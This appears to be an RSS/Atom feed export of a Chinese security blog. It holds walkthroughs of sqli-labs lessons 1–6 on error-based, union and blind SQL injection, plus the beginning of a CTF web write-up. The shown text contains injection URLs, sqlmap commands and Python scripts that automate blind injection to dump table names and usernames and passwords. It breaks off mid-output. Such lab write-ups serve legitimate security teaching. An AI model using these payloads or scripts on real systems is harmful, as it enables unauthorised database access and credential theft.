    <content type="html"><![CDATA[<h1 id="sqli-labs5-6-盲注"><a href="#sqli-labs5-6-盲注" class="headerlink" title="sqli-labs5-6(盲注)"></a>sqli-labs5-6(盲注)</h1><p>[TOC]</p><p>盲注分为以下三类：</p><p>Booleanbase（普通盲注）<br>Timebase（时间盲注）<br>Errorbase（基于报错的盲注）</p><h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p><p>这种类型的SQL注入属于盲注型，使用id=1\观察报错信息<br><a href="http://43.247.91.228:84/Less-5/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1\</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171016_51.png" alt=""></p><pre><code> MySQL server version for the right syntax to use near &#39;&#39;1\&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><p>near ‘’1’’ LIMIT 0,1’ at line 1</p><p>分离最外层的单引号：</p><p>near ‘       ‘   1’  ‘ LIMIT 0,1            ‘ at line 1</p><p>1’是手动输入的，但是还剩下一对双引号，说明后台sql语句应该是这样：</p><p>select * from talbe where id = ‘input’ </p><h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p><h3 id="3-猜测当前数据库名"><a href="#3-猜测当前数据库名" class="headerlink" title="3.猜测当前数据库名"></a>3.猜测当前数据库名</h3><p>方法一： python跑</p><pre><code>import requestsimport stringdataset = &quot; abcdefghijklmnopqrstuvwxyz_&quot;def sendPayload(payload):    url = &quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+ payload    content = requests.get(url).text    return contentdef get_db_length():    count = 1    while count:        payload = &quot;and length(database())=&quot;        payload = payload + str(count) + &quot;%23&quot;        recv = sendPayload(payload)        if &quot;You are in&quot; in recv:            return count        else:            count += 1def getdbName(length):    result=&quot;&quot;    for k in range(length+1):            for j in dataset:                    payload=&quot;and left(database(),&quot;+str(k)+&quot;)=&#39;&quot;+result+j+&quot;&#39;%23&quot;                    recv=sendPayload(payload)                    if &quot;You are in&quot; in recv:                        if j !=&#39; &#39;:                            result+=j                            print result                        breakdef main():    length = get_db_length()     print &quot;the length of database is &quot;,length     getdbName(length)if __name__==&quot;__main__&quot;:    main()</code></pre><p>这里跑出来以后数据库名字是security。<br>方法二手注left：<br><a href="http://43.247.91.228:84/Less-5/?id=1‘" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1‘</a> and (left(database(),1)=’s’)–+<br>left(database(),1)=’s’表示数据库名从左往右取一个字符，判断该字符是否等于s<br>left(database(),2)=’se’表示数据库名从左往右取两个个字符，判断该字符是否等于se</p><p>方法三：使用ascii()函数和substr()函数进行夹逼 </p><blockquote><p>▲ascii(substr((select database()),1,1))=98<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p></blockquote><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p><p>猜测当前数据库名的第二位字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),2,1)&gt;100%23<br>以此类推，最后得到当前数据库名为“security”。 </p><h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘  and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108%23</p><p>方法二：</p><p>已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。</p><pre><code>#!/usr/bin/env python#coding=utf-8import requestsimport stringdef get_data(payload):    url=&quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+payload    content=requests.get(url).text    return contentdef get_table_length(i):    for j in range(0,20):        payload=&quot;and (select length(table_name) from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1)=&quot;+str(j)+&quot;%23&quot;        #print payload        recv=get_data(payload)        if &quot;You are in&quot; in recv:            #print j            return jdef get_TableName():    for i in range(0,20):        result=&quot;&quot;        table_length=get_table_length(i)        if table_length is None:            break        #print table_length        for j in range(table_length+1):            for k in range(48,122):                payload=&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1),&quot;+str(j)+&quot;,1))=&quot;+str(k)+&quot;%23&quot;                recv=get_data(payload)                if &quot;You are in&quot; in recv:                    result+=chr(k)                    print result                    breakdef main():    get_TableName()if __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171315_415.png" alt=""></p><h3 id="5-爆列名-表users下的所有列名"><a href="#5-爆列名-表users下的所有列名" class="headerlink" title="5.爆列名(表users下的所有列名)"></a>5.爆列名(表users下的所有列名)</h3><p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。<br>猜解列的个数<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and %d=(select count(column_name) from information_schema.columns where table_name=’users’)–+<br>猜解列名长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+<br>猜解列名<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p><h3 id="6-爆出字段值-security-users下所有的账号密码"><a href="#6-爆出字段值-security-users下所有的账号密码" class="headerlink" title="6.爆出字段值(security.users下所有的账号密码)"></a>6.爆出字段值(security.users下所有的账号密码)</h3><p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and 1=(select count(username) from security.users)–+<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+<br>判断字段值<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p><h3 id="完整python代码"><a href="#完整python代码" class="headerlink" title="完整python代码"></a>完整python代码</h3><pre><code>import requestsurl = &#39;http://192.168.1.158/sqlilabs/Less-5/?id=1&#39;db_length = 0db_name = &#39;&#39;table_num = 0table_len = 0table_name = &#39;&#39;table_list = []column_num = 0column_len = 0column_name = &#39;&#39;column_list = []dump_num = 0dump_len = 0dump_name = &#39;&#39;dump_list = []i = j = k = 0### 当前数据库名长度 ###for i in range(1,20):    db_payload = &#39;&#39;&#39;&#39; and (length(database())=%d)--+&#39;&#39;&#39; %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if &quot;You are in&quot; in r.text:        db_length = i        print(&#39;当前数据库名长度为：%d&#39; % db_length)        break### 当前数据库名 ###print(&#39;开始猜解数据库名......&#39;)for i in range(1,db_length+1):    for j in range(95,123):        db_payload = &#39;&#39;&#39;&#39; and (left(database(),%d)=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            db_name += chr(j)            # print(db_name)            breakprint(&#39;数据库名：\n[+]&#39;,db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = &#39;&#39;&#39;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if &quot;You are in&quot; in r.text:        table_num = i        breakprint(&#39;一共有%d张表&#39; % table_num)print(&#39;开始猜解表名......&#39;)### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = &#39;&#39;    #### 表名长度 ####    for j in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if &quot;You are in&quot; not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if &quot;You are in&quot; in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint(&#39;表名：&#39;,table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&#39;&#39;&#39; % (        j, i)        r = requests.get(url + db_payload)        if &quot;You are in&quot; in r.text:            column_num = j            print((&quot;[+] 表名：%-10s\t&quot; % i) + str(column_num) + &#39;字段&#39;)            break#### 猜解列名长度 ####column_num = 3print(&#39;%s表中的列名：&#39; % table_list[-1])for j in range(3):    column_name = &#39;&#39;    for k in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if &quot;You are in&quot; not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if &quot;You are in&quot; in r.text:                column_name += chr(l)    print(&#39;[+] &#39;,column_name)    column_list.append(column_name)print(&#39;开始爆破以下字段：&#39;,column_list[1:])for column in column_list[1:]:    print(column,&#39;：&#39;)    dump_num = 0    for i in range(30):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(%s) from %s.%s)--+&#39;&#39;&#39; % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = &#39;&#39;        #### 字段长度 ####        for j in range(1, 21):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if &quot;You are in&quot; not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if &quot;You are in&quot; in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print(&#39;[+]&#39;,dump_name)</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs5-6-盲注&quot;&gt;&lt;a href=&quot;#sqli-labs5-6-盲注&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs5-6(盲注)&quot;&gt;&lt;/a&gt;sqli-labs5-6(盲注)&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;盲注分
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs  1-4</title>
    <link href="http://0xmj.club/2018/04/02/Sqli-labs-1-4/"/>
    <id>http://0xmj.club/2018/04/02/Sqli-labs-1-4/</id>
    <published>2018-04-02T08:13:07.000Z</published>
    <updated>2018-04-23T13:25:14.109Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs-1-4"><a href="#Sqli-labs-1-4" class="headerlink" title="Sqli-labs  1-4"></a>Sqli-labs  1-4</h1><p>[TOC]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p><p>##安装<br>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170021_645.png" alt=""></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1</p><p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1</p><p>最外层的单引号是标识错误的，将其隔离</p><pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p><pre><code>select uername,password from talble where id = &#39;input&#39;-----&gt;select uername,password from talble where id = &#39;input 攻击代码&#39;</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170025_607.png" alt=""></p><blockquote><p>使用union语句查询时，必须使前面的语句查询出错(例如id=-1，而id中并没有为-1的)，以为当查询出错时，sql语句结果为空，也就会显示我们构造的sql语句所查询的内容，即union之后语句的执行结果。</p></blockquote><p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170038_567.png" alt=""></p><p>6.暴列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.<strong>columns</strong> where <strong>table_name</strong>=’users’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170043_887.png" alt=""></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p><pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层单引号：</p><pre><code>near &#39;     &#39; LIMIT 0,1     &#39; at line 1</code></pre><p>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：</p><pre><code>select username,password from table where id = input</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170110_138.png" alt=""></p><h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170121_987.png" alt=""></p><pre><code>MySQL server version for the right syntax to use near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>现将外层单引号去掉</p><pre><code>near &#39;              &#39;  1\  &#39;) LIMIT 0,1           &#39; at line 1</code></pre><p> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )</p><p>所以修改sql语句：</p><p>select username，password from table where id = (‘input’)</p><p>所以再用这样的代码来进行注入：</p><pre><code>?id=1′) –-+</code></pre><p>1’) and (‘1’=’1<br>放入sql语句中：</p><p>select username，password from table where id = (‘  1’) and (‘1’=’1  ‘)</p><p>2.确定字段个数</p><p>3.判断回显位(2,3处为显示位)</p><p>4.爆数据库名字、连接账号信息</p><p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p><h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near ‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p><pre><code>near &#39;&quot;3\&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层的单引号，那是用来标识错误信息的</p><pre><code>near &#39;           &quot;  3\  &quot;) LIMIT 0,1             &#39; at line 1</code></pre><p>其中 3\ 是手动输入的，还剩下””)</p><p>说明sql语句中应该有 (“”)   （ 括号也配对）</p><p>再次猜测sql语句：</p><pre><code>select * username,password from table where id = (&quot;input&quot;)</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170145_156.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs-1-4&quot;&gt;&lt;a href=&quot;#Sqli-labs-1-4&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs  1-4&quot;&gt;&lt;/a&gt;Sqli-labs  1-4&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web—writeup</title>
    <link href="http://0xmj.club/2018/04/02/%E5%AE%9E%E9%AA%8C%E5%90%A7web%E2%80%94writeup/"/>
    <id>http://0xmj.club/2018/04/02/实验吧web—writeup/</id>
    <published>2018-04-02T08:10:18.000Z</published>
    <updated>2018-04-02T08:11:11.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_235.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_176.png" alt=""></p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="http://oy0tigw51.bkt.clouddn.com/201803181643_54.png" alt=""></p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p><p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p><p>回显</p><p>available databases [2]:<br>[<em>] information_schema<br>[</em>] test<br>注表名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” –tables –level 5<br>回显</p><p>Database: test<br>[1 table]<br>+——-+<br>| admin 